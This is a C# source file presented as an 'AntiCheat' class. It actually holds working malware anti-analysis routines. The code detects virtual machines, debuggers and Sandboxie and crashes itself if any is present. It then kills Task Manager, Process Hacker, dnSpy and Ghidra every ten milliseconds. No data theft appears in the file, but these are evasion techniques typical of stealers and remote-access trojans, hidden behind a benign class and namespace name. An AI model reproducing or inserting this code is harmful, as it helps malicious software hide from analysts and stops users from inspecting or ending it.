using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

namespace DebuggerStepThroughAttribute
{
    class AntiCheat
    {
        public static void KeepTheSafesty()
        {

            new Thread(() =>
            {
                RunAntiAnalysis();
            }).Start();

        }

        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);

            while (true)
            {
                DetectProcess();
                Thread.Sleep(10);
            }
        }

        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }


        private static void DetectProcess()
        {
            List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr", "dnSpy", "ghidra" };
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (ProcessName.Contains(process.ProcessName))
                        process.Kill();
                }
                catch { }
            }
        }


        

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
}
